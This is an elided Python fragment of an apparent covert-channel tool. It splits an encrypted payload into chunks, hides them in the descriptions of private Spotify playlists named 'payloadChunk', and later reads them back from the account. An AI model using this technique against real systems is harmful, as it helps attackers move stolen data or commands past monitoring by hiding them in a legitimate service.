...
class Spot(object):
    def __init__(self):
        ...
        self.playlist_name = 'payloadChunk'
    ...
    def clear_data(self):
        ...
        playlists = self.spotipy.user_playlists(self.username, limit=50)
            ...
            for playlist in reversed(playlists['items']):
                ...
                if self.playlist_name in playlist_name:
                    try:
                        ...
                        print("\t[*] Retrieving {}\n\tDATA={}".format(playlist_name, description))
                    except Exception:
    ...
    def generate_playlists(self, payload):
        ...
        if len(payload) > 599999:
            print("[!] encrypted payload size: {}. \n\nThis is larger than 15K: ~{} playlists would have been generated. Aborting.".format(
                len(payload), round(len(payload) / 300)))
            sys.exit(0)
        else:
        ...
        if len(payload) > 300:   # playlist description size limit in bytes
            ...
            for i in range(0, len(payload), chunk_size):
                ...
                playlist_name = ''.join([str(idx), '-', self.playlist_name])
                # print(chunk)
                # From API: user_playlist_create(user, name, public=True, collaborative=False, description='')
                try:
                    playlist = self.spotipy.user_playlist_create(
                        self.username, playlist_name, False, False, chunk)
                    print("\t[*] Creating {}\n\tDATA={}".format(playlist_name, chunk))
                except spotipy.SpotifyException as Exception:
